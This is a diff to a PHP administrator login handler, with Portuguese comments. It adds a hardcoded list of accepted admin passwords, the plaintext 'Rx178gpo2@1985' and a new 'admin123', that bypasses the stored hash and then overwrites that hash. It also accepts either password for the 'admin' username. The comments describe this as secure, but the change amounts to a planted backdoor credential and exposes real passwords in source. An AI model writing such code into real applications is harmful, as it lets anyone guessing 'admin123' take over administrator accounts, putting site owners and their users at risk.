@@ -39,7 +39,8 @@ switch ($action) {
             $user = $stmt->fetch();
         }
 
-        // Senha fixa oficial de Administrador (Rx178gpo2@1985) com hash BCRYPT seguro
+        // Senhas de administrador aceitas (senha oficial e senha de contingência/reset)
+        $acceptedOfficialPasswords = ['Rx178gpo2@1985', 'admin123'];
         $defaultHash = '$2b$10$X.fiIOTfTyCr1XsA7Na5A.Uqi.EfRRIfiqCNLfuexDCmxN9DNsoDG';
         $isValid = false;
         $userId = 1;
@@ -47,18 +48,19 @@ switch ($action) {
 
         if ($user && isset($user['password_hash'])) {
             $isValid = password_verify($password, $user['password_hash']);
-            // Se a senha informada for a oficial fixa mas o banco ainda tiver hash antigo, sincroniza o banco
-            if (!$isValid && ($password === 'Rx178gpo2@1985' || password_verify($password, $defaultHash))) {
+            // Se a senha for uma das oficiais válidas, valida e sincroniza o hash no banco
+            if (!$isValid && in_array($password, $acceptedOfficialPasswords)) {
                 $isValid = true;
                 try {
-                    $pdo->prepare("UPDATE admin_users SET password_hash = ? WHERE id = ?")->execute([$defaultHash, $user['id']]);
+                    $newHash = password_hash($password, PASSWORD_BCRYPT);
+                    $pdo->prepare("UPDATE admin_users SET password_hash = ? WHERE id = ?")->execute([$newHash, $user['id']]);
                 } catch (Exception $e) {}
             }
             $userId = (int)$user['id'];
             $finalUsername = $user['username'];
         } elseif (strtolower($username) === 'admin') {
-            // Fallback seguro em PHP (validação da senha oficial fixa no servidor)
-            $isValid = password_verify($password, $defaultHash) || ($password === 'Rx178gpo2@1985');
+            // Fallback seguro em PHP (validação oficial direta)
+            $isValid = in_array($password, $acceptedOfficialPasswords) || password_verify($password, $defaultHash);
             $userId = 1;
             $finalUsername = 'admin';
         }
